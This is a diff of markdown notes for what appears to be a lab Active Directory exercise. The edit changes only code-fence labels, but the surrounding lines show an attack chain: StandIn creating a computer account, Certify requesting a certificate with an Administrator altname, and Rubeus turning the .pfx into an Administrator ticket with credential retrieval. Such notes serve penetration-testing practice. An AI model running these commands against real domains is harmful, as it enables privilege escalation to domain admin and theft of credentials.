@@ -13,8 +13,8 @@ Mythic: make_token <domainName>\<username> <passworD>
 
 ## Create computer accounts:
 
-```cmd
-StandIn: 
+```powershell
+##StandIn: 
 
 Standin.exe -computer <computer name> -make
 ```
@@ -34,13 +34,13 @@ Set-DomainObject -SearchBase "CN=Certificate Tempaltes,CN=Public Key Services,CN
 
 ## Request the certificate for admin with certify
 
-```cmd
+```powershell
 Certify.exe request /ca:dc01.mythical-us.vl\mythical-us-DC01-CA /template:Machine /altname:Administrator@mythical-us.vl
 ```
 
 ## User Rubeus to get ticket as Administrator from the generated .pfx file
 
-```cmd
+```powershell
 Rubeus.exe asktgt /user:Administrator /certificate:<path to .pfx file> /ptt /nowrap /getcredentials
 ```
 
